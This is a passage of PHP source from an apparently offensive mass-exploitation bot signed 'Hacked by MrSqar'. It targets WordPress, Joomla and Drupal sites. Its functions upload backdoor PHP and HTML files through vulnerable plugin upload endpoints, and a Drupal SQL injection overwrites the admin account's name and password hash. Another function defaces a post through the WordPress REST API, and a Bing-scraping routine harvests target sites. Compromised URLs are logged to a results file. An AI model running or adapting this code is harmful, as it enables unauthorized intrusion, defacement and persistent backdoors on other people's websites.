$hack = $target."/wp-content/uploads/20$y/$m/BadMod.php";
$source2 = @file_get_contents("$hack");
if(preg_match("/Hacked/",$source2)){
echo $red."  [wp_blocker] -==========- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_blocker] -==========- ".$orange."Failed"." \n";
}
}
function wp_formcraft($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$file = "BackDoor/mrsqar.png";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$post = array('files[]'=> $cFile);
$target1 = $target."/wp-content/plugins/formcraft/file-upload/server/content/upload.php";
$source = @file_get_contents("$target1");
if(preg_match("/failed/",$source)){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$exp = explode("files",$result);
$arr = array(
"\/" => "",
'"' => "",
"}" => "",
"{" => "",

);
$rb = str_replace(array_keys($arr),$arr,$exp[4]);
$hack = $target."/wp-content/plugins/formcraft/file-upload/server/content/files/$rb";
echo $red."  [wp_formcraft] -========- ".$green." Done ! \n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_formcraft] -========- ".$orange."Failed"." \n";
}
}
#
function wp_ads($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$file = "BackDoor/BadMod.php";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$target1 = $target."/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";
$target2 = $target."/wp-content/plugins/simple-ads-manager/readme.txt";
$source = @file_get_contents("$target2");
if(preg_match("/Simple/",$source)){
$post = array('path' => './','uplaodfile'=> $cFile,'action' => "upload_ad_image");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/wp-content/plugins/simple-ads-manager/BadMod.php";
$source2 = @file_get_contents("$hack");
if(preg_match("/Hacked/",$source2)){
echo $red."  [wp_ads] -==============- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_ads] -==============- ".$orange."Failed"." \n";
}
}
else{
echo $red. "  [wp_ads] -==============- ".$orange."Failed"." \n";
}
}

function com_fabrik($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$file = "BackDoor/BadMod.txt";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$target1 = $target."/index.php?option=com_fabrik&c=import&view=import&fietype=csv&tableid=0&Itemid=0";
$source = @file_get_contents("$target1");
if(preg_match("/CSV/",$source)){
$post = array('userfile'=> $cFile,'drop_data' => "1",'overwrite' => "1",'field_delimiter' => "," , 'text_delimiter' => '"','option' => "com_fabrik",'controller' => "import",'view' => "import",'task' => "doimport",'tableid' => "0");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/media/BadMod.txt";
$source2 = @file_get_contents("$hack");
if(preg_match("/Yemeni/",$source2)){
echo $red."  [com_fabrik] -======================- ".$green." Done ! \n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [com_fabrik] -======================-  ".$orange."Failed"." \n";
}
}else{
echo $red. "  [com_fabrik] -======================-  ".$orange."Failed"." \n";	
}
}
function wp_jquery($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$file = "BackDoor/BadMod.php";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$post = array('files'=> $cFile);
$target1 = $target."/assets/global/plugins/jquery-file-upload/server/php/";
$source1 = @file_get_contents("$target1");
if(preg_match("/files/",$source1)){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target1."/BadMod.php";
$source = @file_get_contents("$hack");
if(preg_match("/Hacked/",$source)){	
echo $red."  [wp_jquery] -===========- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}else{
echo $red. "  [wp_jquery] -===========- ".$orange."Failed"." \n";
}
}else{
echo $red. "  [wp_jquery] -===========- ".$orange."Failed"." \n";

	}
}
function wp_dreamwork($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$file = "BackDoor/BadMod.html";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$post = array('task' => "drm_add_new_album",'album_name' => "Arbitrary File Upload",'album_desc' => "Arbitrary File Upload",'album_img'=> $cFile);
$ch = curl_init();
$target1 = $target."/wp-admin/admin.php?page=dreamwork_manage";
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec($ch);
curl_close ($ch);
if(preg_match("/wp-content/",$result)){
$exp = explode("wp-content",$result);
$arr = array(
'(' => "",
')' => "",
'Error' => "",
);
$rb = str_replace(array_keys($arr),$arr,$exp);
$hack = $target.$rb[1];
if(preg_match("/wp-content/",$hack)){
$hack = $target.$rb[1];
	}else{
$hack = $target."/wp-content/".$rb[1];
$hack = trim($hack);
	}
$src = @file_get_contents("$hack");
if(preg_match("/Hacked/",$src)){
echo $red."  [dreamwork_manage] -====- ".$green." Done !\n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$hack);
fwrite($hacked,"\n");
fclose($hacked);
}
}else{
echo $red. "  [dreamwork_manage] -====- ".$orange."Failed"." \n";

}
}

function wp_rightnow($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$file = "BackDoor/BadMod.html";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($file);
} else { // 
  $cFile = '@' . realpath($file);
}
$post = array('Filedata'=> $cFile);
$target1 = $target."/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$target1);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result= curl_exec ($ch);
curl_close ($ch);
$source = "$target/wp-content/uploads/settingsimages/badmod.html";
$source2 = @file_get_contents("$source");
if(preg_match("/Hacked/",$source2)){
echo $red."  [wp_rightnow] -=========- ".$green."Done ! \n";
$hacked = fopen("result/Hacked.txt","a+");
fwrite($hacked,$source);
fwrite($hacked,"\n");	
fclose($hacked);
}else
	{
echo $red. "  [wp_rightnow] -=========- ".$orange."Failed"." \n";
		}
}

function wp_upload($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$target1 = $target."/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="BackDoor/BadMod.php";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
  $cFile = '@' . realpath($uploadfile);
}
$post = array('file'=> $cFile);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"$target1");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result=curl_exec ($ch);
curl_close ($ch);
$result2 = $target."/wp-content/plugins/cherry-plugin/admin/import-export/BadMod.php";
$h2 = @file_get_contents("$result2");
if(preg_match("/BadMod/",$h2)){
echo $red."  [upload] -==============- ".$green." Done\n";
$hacked = fopen("result/Hacked.txt","a+");
$def = $target."/"."badmod.html";
fwrite($hacked,$def);
fwrite($hacked,"\n");
echo $result2;
	}else{
echo $red. "  [wp_upload] -===========- ".$orange."Failed"." \n";

}
}else{
echo $red. "  [wp_upload] -===========- ".$orange."Failed"." \n";

}
}

function add_user($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
    $log = "/user/login";
    $url2 = $target.$log;
    $holako = "/?q=user";
    $post_data = "name[0;update users set name %3D 'badmod' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
    )
    );
    $ctx = @stream_context_create($params);
    $data = @file_get_contents("$url2", null, $ctx);
    if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data)|| (stristr($data, 'FcUk Crap') && $data)) {
$result = fopen("result/Hacked.txt","a+");	
echo $red."  [add_user] ====> ".$green." Done !\n";
fwrite($result,$url2." => username : badmod  => password : admin");
fwrite($result,"\n");
fclose($result);
    } else {
echo $red. "  [add_user] ====> ".$orange."Failed"." \n";
}
	}

function joom_down($url){
if(!preg_match("/http/",$url)){
$url = "http://".$url;	
}
     $file1='BackDoor/BadMod.zip';
     $file2='BackDoor/BadMod.gif';
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile1 = curl_file_create($file1);
} else { // 
  $cFile1 = '@' . realpath($file1);
}
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile2 = curl_file_create($file2);
} else { // 
  $cFile2 = '@' . realpath($file2);
}
     $bbb='/index.php?option=com_jdownloads&Itemid=0&view=upload';
     $sco=($url).($bbb); 
        $post=array(
    'name'=>'BadMod_MrSqar','mail'=>'mrsqar@gmail.com','catlist'=>'1','file_upload'=> $cFile1 ,'filetitle' =>"Hacked by MrSqar",
    'description'=>"<p>Hacked</p>" ,'2d1a8f3bd0b5cf542e9312d74fc9766f'=>1,
    'send'=>1,'senden'=>"Send file", 'description'=>"<p>Owned</p>",
    'option'=>"com_jdownloads",'view'=>"upload",'pic_upload'=> $cFile2
    );
        $ch = curl_init ($sco);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT,3 );
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 Safari/537.36");
        curl_setopt ($ch, CURLOPT_POST, TRUE);
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
        $data = curl_exec ($ch);
        curl_close ($ch);
    $path='/images/jdownloads/screenshots/';
    $TheEnd=($url).($path).($file2);
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
    if(preg_match("/color=\"green\">/",$data)){
echo $red. "  [com_j-d] -=========================-  ".$green."Done"." \n";
$result = fopen("result/Hacked.txt","a+");	
fwrite($result,$TheEnd);
fwrite($result,"\n");
    }else{
echo $red. "  [com_j-d] -=========================-  ".$orange."Not Vuln"." \n";	
	}
} 

function drupal_upload($target){
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$uploadfile="mrsqar.gif";
$uploadfile2="mrsqar.jpg";
$ch = curl_init("$target/sites/all/modules/dragdrop_gallery/upload.php?nid=1&filedir=/drupal/sites/all/modules/dragdrop_gallery/");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, array('user_file[0]'=>"@$uploadfile",
                                            'user_file[1]'=>"@$uploadfile2"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
$ok = @get_headers("$target/sites/all/modules/dragdrop_gallery/$uploadfile");
if(preg_match("/404/",$ok[0])){
echo $red. "  [upload] ====> ".$orange."Failed"." \n";
}else{
$result = fopen("result/Hacked.txt","a+");	
$ok = "$target/sites/all/modules/dragdrop_gallery/$uploadfile";
echo $red."  [upload] ====> ".$green." Done !\n";
fwrite($result,$ok);
fwrite($result,"\n");
fclose($result);
}
}
function contents($target){
if(!preg_match("/http/",$target)){
$target = "http://".$target;	
}
$source = @file_get_contents("$target"."/wp-json/wp/v2/posts/");
$exp = explode(",",$source);
$black = array(
        '{'  => '', 
        '"'  => '', 
        'id'  => '', 
        ':'  => '', 
        '['  => '', 
        ']'  => '', 
);
$rb = @str_replace( array_keys( $black ), $black, $exp[0] );
$content = "
      HaCkEd bY MrSqAr HaCkEr 
	  BadMod Yemeni bot v1.0       
";
$file = "badmod.html";
$id = $rb."justracccwdata";
$target2 = $target."/wp-json/wp/v2/posts/1";
$data = array("id" => $id,"title" => "Hacked by MrSqar !","slug" => $file , "content" => $content);                                                                    
$data_string = json_encode($data);                                                                                   
$ch = curl_init("$target2");                                                                      
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");                                                                     
curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);                                                                  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                                                                      
curl_setopt($ch, CURLOPT_HTTPHEADER, array(                                                                          
    'Content-Type: application/json',                                                                                
    'Content-Length: ' . strlen($data_string))                                                                       
);                                                                                                                   
$result = curl_exec($ch);
//echo $result;
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
if(preg_match("/$file/",$result)){
echo $red. "  [inject] -==============- ".$green."Done"." \n";
$hacked = fopen("result/Hacked.txt","a+");
$def = $target."/"."badmod.html";
fwrite($hacked,$def);
fwrite($hacked,"\n");
	} else {		
$op_system = php_uname();
if(preg_match("/Linux/",$op_system)){
	$green  = "\e[92m";
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
}else{
	$green  = "";
	$orange = "";
	$red    = "";
}
echo $red. "  [inject] -==============- ".$orange."Failed"." \n";
}
}
function bing($what) {
    for ($i = 1;$i <= 300000;$i+= 10) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.bing.com/search?q=" . urlencode($what) . "&&first=" . $i . "&FORM=PERE");
        curl_setopt($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/log.txt');
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/log.txt');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        $data = curl_exec($ch);
        preg_match_all('#;a=(.*?)" h="#', $data, $links);
        foreach ($links[1] as $link) {
            $allLinks[] = $link;
        }
        if (!preg_match('#"sw_next"#', $data)) break;
    }
    if (!empty($allLinks) && is_array($allLinks)) {
        return array_unique(array_map("urldecode", $allLinks));
    }
}
function site($link) {
    $parse = parse_url($link);
    return $parse['scheme'] . "://" . $parse['host'];
}
function get_version($target){
$OK = @get_headers("$target/readme.html");
if(@preg_match("/OK/",$OK[0])){
$source =  @file_get_contents("$target/readme.html");
$black = array(
        '"' => '', 
        '/'  => '', 
        '<'  => '', 
        '>'  => '', 
        'li'  => '', 
        'h1'  => '', 
        'h2'  => '', 
        'h3'  => '', 
        'h4'  => '', 
        'h5'  => '', 
        'head'  => '', 
        'title'  => '', 
        'body'  => '', 
        'html'  => '', 
        'style'  => '', 
        'href'  => '', 
        '='  => '', 
        'meta'  => '', 
        'http'  => '', 
        'https'  => '', 
        ':'  => '', 
        '//'  => '', 
        'www'  => '', 
        'com'  => '', 
        'php'  => '', 
        'DOCTYPE'  => '', 
        '!'  => '', 
        '<br />'  => '', 
        'br'  => '', 
        '/>'  => '', 
        '<'  => '', 
);
$ex = @explode("\n",$source);
$rb = @str_replace( array_keys( $black ), $black, $ex[11] );
$rb = @trim($rb);
echo $rb;
}else {

//	echo " Error this not wordpress !! "."\n";
		}
	
	
}


###############################################
#//||||||||||||  Functionsu end  ||||||||||||\\#
###############################################u



?>
